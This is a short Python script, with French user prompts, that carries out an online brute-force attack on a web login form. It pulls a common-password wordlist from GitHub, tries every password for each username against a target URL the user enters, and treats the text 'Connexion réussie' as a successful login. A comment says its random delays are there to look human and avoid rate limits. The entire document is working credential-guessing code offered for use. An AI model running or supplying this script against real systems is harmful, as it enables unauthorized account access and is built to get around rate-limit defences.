import requests
import itertools
import random
import time

def download_password_list(url):
    response = requests.get(url)
    if response.status_code == 200:
        return response.text.splitlines()
    else:
        print("Failed to download the password list.")
        return []

def brute_force_login(url, usernames, passwords):
    session = requests.Session()
    found_credentials = []

    for username in usernames:
        for password in passwords:
            print(f"Trying {username} / {password}")
            data = {'username': username, 'password': password}
            try:
                response = session.post(url, data=data, timeout=10)
                if 'Connexion réussie' in response.text:
                    print(f'Success! Credentials found: {username} / {password}')
                    found_credentials.append((username, password))
                    break
            except requests.exceptions.RequestException as e:
                print(f"Error during login attempt for {username}: {e}")
            time.sleep(random.uniform(1, 3))  # Random delay to mimic human interaction and avoid rate limits

    return found_credentials

def get_user_input():
    url = input("Saisissez l'URL du formulaire de connexion : ")
    choice = input("Choisissez la méthode de saisie du nom d'utilisateur :\na. Nom d'utilisateur depuis une base de donnée\nb. Nom d'utilisateur au choix\nEntrez votre choix (a/b): ")
    
    if choice.lower() == 'a':
        usernames = ['user1', 'user2', 'user3']  # Example usernames, replace with your API call if needed
    elif choice.lower() == 'b':
        username = input("Entrer le nom d'utilisateur de votre choix : ")
        usernames = [username]
    
    password_list_url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt"
    passwords = download_password_list(password_list_url)

    if usernames and passwords:
        found_credentials = brute_force_login(url, usernames, passwords)
        if found_credentials:
            for user, pwd in found_credentials:
                print(f'Found credentials: {user} / {pwd}')
        else:
            print("No valid credentials found.")
    else:
        print("Missing usernames or passwords data.")

if __name__ == "__main__":
    get_user_input()
